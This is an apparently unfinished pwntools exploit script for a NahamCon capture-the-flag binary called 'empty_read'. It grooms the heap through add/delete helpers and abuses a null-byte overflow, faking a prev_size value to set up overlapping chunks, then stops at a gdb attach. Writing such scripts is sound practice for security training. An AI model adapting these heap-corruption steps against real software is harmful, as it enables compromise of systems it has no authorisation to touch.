from pwn import *

elf = ELF("./empty_read")
target = process([elf.path])
#target = remote("challenge.nahamcon.com", 32470)

def sa(s, d):
	target.sendafter(s, d)

def sla(s, d):
	target.sendlineafter(s, d)

def add(idx, email_len, email):		#max 10 emails, max size 0x200, null byte overflow
	sla("-\n", "add")
	sla(":", str(idx))
	sla(":", str(email_len))
	sa(":", email)

def edit(idx, email):
	sla("-\n", "edit")
	sla(":", str(idx))
	sa(":", email)

def remove(idx):
	sla("-\n", "delete")
	sla(":", str(idx))

def show():
	sla("-\n", "print")

for i in range(6):
	add(i, 0x8, "A"*8)
for i in range(6):
	remove(i)

for i in range(10):
	add(i, 0xfc, str(i)*8)

for i in range(7):
	remove(i)

remove(8)
remove(7)


add(0, 0x12c, "0"*8)
add(1, 0xcc, "1"*0xc8 + p32(0x100))
add(2, 0x1a0, "THE WALL")

#remove(9)

gdb.attach(target)

#remove(2)
#show()



target.interactive()